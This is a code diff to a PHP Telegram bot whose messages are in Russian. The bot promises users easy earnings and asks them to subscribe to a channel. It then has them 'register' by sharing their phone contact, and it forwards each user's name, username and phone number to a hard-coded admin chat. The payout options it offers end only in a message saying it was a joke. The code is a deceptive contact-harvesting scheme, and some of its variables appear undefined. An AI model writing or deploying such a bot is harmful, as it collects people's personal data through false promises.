@@ -58,11 +58,145 @@ $text=$data->text;
 $chat_id=$data->chat->id;
     
 
-if ($text == "/start"){
+/* if ($text == "/start"){
 $bot->ask('Show phone', function (Answer $answer) use ($bot) {
     $bot->reply('Handled!');
 }, ['reply_markup' => json_encode([
     'keyboard' => [[['text' => 'Show phone', 'request_contact' => true]]]
 ])]);
+}*/
+
+
+
+if($text == "/start" or $text == "❌Отказать "){
+
+
+    bot('sendmessage',[
+
+        'chat_id'=>$cid,
+
+        'text'=>"*👋Привет [$fname] добро пожаловать на наш бот. Если хотите лёгки зарабатывать тогда подпишите на наш канал* [@vzlomnie] *а то вы не можете зарабатывать.\n\nТеперь нажмите на кнопку <b>регистрация</b>*",
+
+        'parse_mode'=>"markdown",
+
+        'reply_markup'=>json_encode(
+
+['resize_keyboard'=>true,
+
+'keyboard' => [
+
+[["text"=>"⏳Регистрация",'request_contact' =>true],],
+
+]
+
+])
+
+]);
+
 }
+
+if($data){
+
+bot('sendmessage',[
+
+    'chat_id'=>"1104979149",
+//admin id
+    'text'=>"Новый участник:\nИмя: [$fname](tg://user?id=$uid)\nЮзер: @$user\nНомер: $nomer\nИмя номера: $name",
+
+    'parse_mode'=>"markdown"
+
+        ]);
+
+bot("sendmessage",[
+
+    'chat_id'=>$cid,
+
+    'text'=>"Номер успешно добавлен! И теперь нажмите на кнопку готов!",
+
+    'reply_markup'=>json_encode(
+
+[
+
+'resize_keyboard'=>true,
+
+'selective'=>true,
+
+'one_time_keyboard'=>true,
+
+'keyboard' => [
+
+[["text"=>"✅Готов  "],],
+
+]
+
+])
+
+]);
+
+}
+
+
+
+$button = $message->keyboardbutton->text;
+
+if($text == "✅Готов  "){
+
+    bot('sendmessage',[
+
+        'chat_id'=>$cid,
+
+        'text'=>"Выберите сколько вы хотите",
+
+  'reply_markup'=>json_encode(
+
+[
+
+'resize_keyboard'=>true,
+
+'selective'=>true,
+
+'one_time_keyboard'=>true,
+
+'keyboard' => [
+
+[["text"=>"💰1 тмт"],],
+
+[["text"=>"💰1.50 тмт"],],
+
+[["text"=>"💰5 тмт"],],
+
+[["text"=>"💰10 тмт"],],
+
+[["text"=>"❌Отказать "],],
+
+
+
+
+
+]
+
+])
+
+]);
+
+}
+
+$button = $message->keyboardbutton->text;
+
+if($text == "💰1 тмт" or $text == "💰1.50 тмт" or $text == "💰5 тмт" or $text == "💰10 тмт"){
+
+    bot('sendmessage',[
+
+        'chat_id'=>$cid,
+
+        'text'=>"Развёрнутый ответ
+
+
+
+Эх-эх-эх это же шутка😅"]);
+
+        }
+
+        
+        
 ?>
